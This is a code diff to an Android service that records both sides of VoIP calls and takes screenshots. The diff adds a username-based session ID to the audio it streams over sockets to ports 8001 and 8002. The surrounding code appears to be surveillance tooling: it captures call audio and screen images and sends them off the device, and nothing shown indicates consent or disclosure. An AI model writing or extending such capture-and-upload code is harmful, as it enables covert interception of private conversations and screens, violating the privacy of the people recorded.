@@ -39,11 +39,13 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
+import java.net.ServerSocket;
 import java.net.Socket;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
+import java.util.UUID;
 import java.util.concurrent.atomic.AtomicReference;
 
 public class VoipRecordService extends Service {
@@ -176,6 +178,9 @@ public class VoipRecordService extends Service {
             initScreenshot();
         }
 
+        // 会话的唯一表示
+        String sessionId = UUID.randomUUID().toString() + "_" + username;
+
         String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
         micOutputFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "voip_up_" + timestamp + ".pcm");
         playbackOutputFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "voip_down_" + timestamp + ".pcm");
@@ -216,8 +221,8 @@ public class VoipRecordService extends Service {
             isRecording = true;
 
             // 线程自己管理连接
-            micThread = new Thread(() -> recordAndSendAudio(micRecord, micOutputFile, "uplink", 8001));
-            playbackThread = new Thread(() -> recordAndSendAudio(playbackRecord, playbackOutputFile, "downlink", 8002));
+            micThread = new Thread(() -> recordAndSendAudio(micRecord, micOutputFile, "uplink", 8001, sessionId));
+            playbackThread = new Thread(() -> recordAndSendAudio(playbackRecord, playbackOutputFile, "downlink", 8002, sessionId));
             screenshotThread = new Thread(this::captureAndSendScreenshots);
 
             micThread.start();
@@ -282,7 +287,7 @@ public class VoipRecordService extends Service {
     /**
      * 重构：录制并发送音频的线程任务
      */
-    private void recordAndSendAudio(AudioRecord audioRecord, File outputFile, String direction, int port) {
+    private void recordAndSendAudio(AudioRecord audioRecord, File outputFile, String direction, int port, String sessionId) {
         final int bufferSize = 4096;
         byte[] buffer = new byte[bufferSize];
         Socket socket = null;
@@ -307,6 +312,9 @@ public class VoipRecordService extends Service {
 
                 if (netStream != null) {
                     try {
+                        int size = sessionId.length();
+                        netStream.write(size);
+                        netStream.write(sessionId.getBytes());
                         netStream.write(buffer, 0, read);
                         netStream.flush();
                     } catch (IOException e) {
